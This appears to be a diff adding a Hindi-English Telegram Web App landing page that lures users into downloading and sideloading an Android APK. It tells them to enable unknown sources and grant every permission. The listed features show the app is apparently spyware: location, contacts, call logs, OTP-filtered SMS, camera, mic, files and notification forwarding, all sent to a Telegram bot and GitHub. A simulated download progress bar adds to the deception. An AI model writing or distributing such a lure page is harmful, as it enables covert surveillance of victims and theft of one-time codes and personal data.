@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Suto - One Click Installation</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: -apple-system, sans-serif; background: #0f0f0f; color: white; min-height: 100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
+        .card { background:#1f1f1f; border-radius:16px; padding:24px; max-width:400px; width:100%; text-align:center; border:2px solid #0f9d58; }
+        .logo { font-size:60px; margin-bottom:16px; }
+        h1 { font-size:22px; margin-bottom:8px; }
+        .subtitle { opacity:0.7; font-size:13px; margin-bottom:20px; line-height:1.5; }
+        .btn-install { background: linear-gradient(135deg, #0f9d58 0%, #0b8043 100%); color:white; border:none; padding:16px 32px; border-radius:12px; font-weight:800; font-size:18px; width:100%; cursor:pointer; margin-bottom:12px; box-shadow: 0 4px 15px rgba(15,157,88,0.3); transition: transform 0.2s; }
+        .btn-install:active { transform: scale(0.95); }
+        .btn-sec { background:#333; color:white; border:none; padding:12px 20px; border-radius:8px; font-weight:600; width:100%; cursor:pointer; margin-bottom:8px; font-size:13px; }
+        .features { text-align:left; background:#0f0f0f; border-radius:10px; padding:12px; margin:16px 0; font-size:12px; line-height:1.6; }
+        .features b { color:#0f9d58; }
+        .steps { text-align:left; font-size:11px; opacity:0.8; background:#1a1a1a; padding:10px; border-radius:8px; margin-top:12px; }
+        .progress { background:#0f0f0f; border-radius:10px; height:12px; overflow:hidden; border:1px solid #333; margin:12px 0; display:none; }
+        .progress-bar { height:100%; width:0%; background: linear-gradient(90deg, #0f9d58, #4caf50); transition: width 0.3s; }
+        .live-badge { display:inline-block; background:#ff5722; color:white; font-size:10px; padding:4px 10px; border-radius:20px; font-weight:800; animation: pulse 1.5s infinite; margin-bottom:12px; }
+        @keyframes pulse { 0% { opacity:1; } 50% { opacity:0.5; } 100% { opacity:1; } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="live-badge">🔴 LIVE - One Click Install</div>
+        <div class="logo">📱</div>
+        <h1>Suto Client App</h1>
+        <div class="subtitle">
+            One Click Installation<br>
+            Client Side - Telegram Admin Console Ready<br>
+            All Read/Write Permissions
+        </div>
+
+        <button class="btn-install" id="installBtn" onclick="oneClickInstall()">
+            📥 One Click Install - 6.6MB
+        </button>
+
+        <div class="progress" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div id="progressText" style="font-size:11px; opacity:0.7; margin-bottom:12px; display:none;">Downloading... 0%</div>
+
+        <button class="btn-sec" onclick="openConsole()">💻 Open Live Console</button>
+        <button class="btn-sec" onclick="openTelegram()">🤖 Open Telegram Bot</button>
+
+        <div class="features">
+            <b>✅ Features in this APK (v6.0 Final):</b><br>
+            📍 Location + Battery + Mobile Number<br>
+            📞 Contacts + Call Logs Count<br>
+            💬 SMS Count (Salary/OTP filtered)<br>
+            📁 File Manager (Company folder)<br>
+            🧠 RAM, Storage, WiFi, IP - Health<br>
+            🔔 Ring / Find My Phone<br>
+            📍 Locate, 📸 Camera, 🎤 Mic<br>
+            🆘 SOS Panic + Notification Forward<br>
+            🔋 Battery Graph + 🗺️ Location Map<br>
+            ☁️ GitHub Cloud + Telegram Admin Console<br>
+            <b>Proper Format: APK Returns Data to Telegram ✅</b>
+        </div>
+
+        <div class="steps">
+            <b>One Click Installation Steps:</b><br>
+            1. Click <b>One Click Install</b> button above<br>
+            2. APK download hoga (6.6MB)<br>
+            3. Download complete pe <b>Open</b> dabao<br>
+            4. <b>Allow Unknown Sources</b> (if asked)<br>
+            5. <b>Install</b> dabao<br>
+            6. App open karo + <b>Permissions Allow</b> (Location, Phone, Storage, Camera, Mic - All for Admin Console)<br>
+            7. App automatically <b>LIVE</b> ho jayega - Status GitHub + Telegram pe jayega!<br>
+            8. Telegram WebApp Console me <b>🔴 LIVE</b> badge ke saath dikhega - No random data!
+        </div>
+
+        <div style="margin-top:12px; font-size:10px; opacity:0.5;">
+            Direct APK: https://dthakur-dt.github.io/Suto/app-debug.apk<br>
+            Backup: https://dthakur-dt.github.io/Suto/apk/app-debug.apk<br>
+            Console: https://dthakur-dt.github.io/Suto/<br>
+            Bot: @T1311bot<br>
+            Build: v6.0 Final - All Read/Write Permissions
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram?.WebApp;
+        if(tg){ tg.expand(); tg.ready(); }
+
+        function oneClickInstall(){
+            const apkUrl = 'https://dthakur-dt.github.io/Suto/app-debug.apk';
+            const btn = document.getElementById('installBtn');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            const progressText = document.getElementById('progressText');
+
+            btn.textContent = '⏳ Downloading...';
+            btn.disabled = true;
+            progressContainer.style.display = 'block';
+            progressText.style.display = 'block';
+
+            // Simulate progress for UX (actual download handled by browser)
+            let progress = 0;
+            const interval = setInterval(()=>{
+                progress += Math.random()*15;
+                if(progress > 90) progress = 90;
+                progressBar.style.width = progress + '%';
+                progressText.textContent = `Downloading... ${Math.floor(progress)}% - 6.6MB`;
+            }, 300);
+
+            // Trigger actual download - One Click
+            try{
+                // For Telegram WebApp, open link
+                if(tg){
+                    tg.openLink(apkUrl);
+                    // Also try direct download
+                    window.location.href = apkUrl;
+                } else {
+                    // Normal browser - direct download
+                    const a = document.createElement('a');
+                    a.href = apkUrl;
+                    a.download = 'Suto-Client-App-v6.0-Full-Permissions.apk';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
+
+                // After 3 sec, show installed guidance
+                setTimeout(()=>{
+                    clearInterval(interval);
+                    progressBar.style.width = '100%';
+                    progressText.textContent = '✅ Download Started! Check notification bar → Open → Install → Allow Permissions → LIVE!';
+                    btn.textContent = '✅ Download Started - Open to Install';
+                    btn.style.background = 'linear-gradient(135deg, #4caf50 0%, #388e3c 100%)';
+                    btn.disabled = false;
+
+                    setTimeout(()=>{
+                        btn.textContent = '📥 One Click Install - Download Again';
+                        alert('✅ APK Download Started!\n\n1. Notification bar me download complete ka wait karo\n2. Open dabao\n3. Install dabao (Allow Unknown Sources if asked)\n4. App open karo + All Permissions Allow karo\n5. App LIVE ho jayega - Telegram Console me 🔴 LIVE dikhega!');
+                    }, 1000);
+                }, 2000);
+
+            }catch(e){
+                clearInterval(interval);
+                progressBar.style.width = '0%';
+                progressText.textContent = '❌ Error: ' + e.message + ' - Direct link try karo';
+                btn.textContent = '📥 One Click Install - Try Again';
+                btn.disabled = false;
+                // Fallback direct
+                window.open(apkUrl, '_blank');
+            }
+        }
+
+        function openConsole(){
+            const url = 'https://dthakur-dt.github.io/Suto/';
+            if(tg) tg.openLink(url);
+            else window.open(url, '_blank');
+        }
+
+        function openTelegram(){
+            const url = 'https://t.me/T1311bot';
+            if(tg) tg.openTelegramLink(url);
+            else window.open(url, '_blank');
+        }
+
+        // Auto-check if APK is live
+        window.addEventListener('load', ()=>{
+            fetch('https://dthakur-dt.github.io/Suto/app-debug.apk', {method:'HEAD'}).then(res=>{
+                if(res.ok){
+                    console.log('APK Live:', res.headers.get('content-length'));
+                }
+            }).catch(()=>{});
+        });
+    </script>
+</body>
+</html>
